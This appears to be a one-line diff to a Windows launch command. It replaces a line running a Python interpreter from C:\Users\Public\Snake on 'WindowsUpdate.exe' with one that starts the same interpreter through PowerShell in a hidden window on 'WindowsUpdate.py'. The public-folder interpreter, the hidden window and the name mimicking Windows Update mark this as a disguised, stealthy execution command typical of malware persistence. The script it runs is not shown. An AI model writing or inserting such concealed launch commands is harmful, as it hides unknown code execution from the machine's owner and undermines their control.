@@ -1,1 +1,1 @@
-C:\\Users\\Public\\Snake\\python.exe C:\\Users\\Public\\WindowsUpdate.exe
+C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -windowstyle hidden C:\\Users\\Public\\Snake\\python.exe C:\\Users\\Public\\WindowsUpdate.py
